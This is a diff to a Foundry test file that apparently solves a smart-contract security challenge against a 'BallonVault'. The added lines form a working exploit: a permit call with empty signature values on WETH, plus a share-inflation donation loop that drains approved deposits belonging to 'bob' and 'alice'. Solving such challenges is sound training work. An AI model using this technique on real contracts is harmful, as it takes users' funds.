@@ -11,8 +11,6 @@ import {BallonVault} from "../src/5_balloon-vault/Vault.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-
-
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
 ////////////////////////////////////////////////////////////*/
@@ -49,10 +47,16 @@ contract Challenge5Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge5Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
-
-
+        weth.deposit{value: 10 ether}();
+        weth.transfer(attacker, 10 ether);
+        weth.approve(address(vault), type(uint256).max);
+        while (weth.balanceOf(address(attacker)) < 1010 ether) {
+            vault.depositWithPermit(attacker, 1 wei, 0, 0, 0, 0);
+            weth.transfer(address(vault), weth.balanceOf(address(attacker)));
+            vault.depositWithPermit(bob, 1 ether, 0, 0, 0, 0);
+            vault.depositWithPermit(alice, 1 ether, 0, 0, 0, 0);
+            vault.withdraw(vault.maxWithdraw(attacker), attacker, attacker);
+        }
         //==================================================//
         vm.stopPrank();
 
